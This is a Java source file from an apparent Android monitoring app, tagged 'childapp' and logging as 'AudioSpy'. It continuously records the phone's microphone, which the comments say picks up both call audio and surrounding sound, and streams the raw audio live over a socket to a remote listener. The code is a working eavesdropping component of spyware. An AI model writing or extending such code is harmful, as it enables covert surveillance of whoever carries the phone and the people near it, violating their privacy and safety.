package com.example.childapp;

import android.annotation.SuppressLint;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.util.Log;

import io.socket.client.Socket;

public class LiveAudioManager {

    private Socket mSocket;
    private String deviceId;
    private boolean isRecording = false;
    private AudioRecord audioRecord;
    private Thread recordingThread;

    // ðŸ”¥ SETTING: 16kHz (Must match HTML)
    private static final int SAMPLE_RATE = 16000;
    private static final int CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO;
    private static final int AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT;

    public LiveAudioManager(Socket socket, String deviceId) {
        this.mSocket = socket;
        this.deviceId = deviceId;
    }

    @SuppressLint("MissingPermission") // Permissions MainActivity mein checked hain
    public void startAudioStream() {
        if (isRecording) return;

        int minBufSize = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT);

        try {
            // MIC source call audio aur aas paas ki aawaz dono uthata hai
            audioRecord = new AudioRecord(
                    MediaRecorder.AudioSource.MIC,
                    SAMPLE_RATE,
                    CHANNEL_CONFIG,
                    AUDIO_FORMAT,
                    minBufSize
            );

            if (audioRecord.getState() == AudioRecord.STATE_INITIALIZED) {
                audioRecord.startRecording();
                isRecording = true;
                Log.d("AudioSpy", "Started Streaming at 16000Hz");

                recordingThread = new Thread(() -> {
                    // Buffer size chota rakha hai taaki delay na ho
                    byte[] buffer = new byte[4096]; 

                    while (isRecording) {
                        int bytesRead = audioRecord.read(buffer, 0, buffer.length);
                        
                        if (bytesRead > 0) {
                            if (mSocket != null && mSocket.connected()) {
                                // Raw Binary Data bhej rahe hain (Fastest)
                                mSocket.emit("audio-stream", buffer);
                            }
                        }
                    }
                });
                recordingThread.start();
            } else {
                Log.e("AudioSpy", "Mic Init Failed");
            }
        } catch (Exception e) {
            Log.e("AudioSpy", "Error: " + e.getMessage());
        }
    }

    public void stopAudioStream() {
        isRecording = false;
        try {
            if (audioRecord != null) {
                audioRecord.stop();
                audioRecord.release();
                audioRecord = null;
            }
            if (recordingThread != null) {
                recordingThread = null;
            }
            Log.d("AudioSpy", "Mic Stopped");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
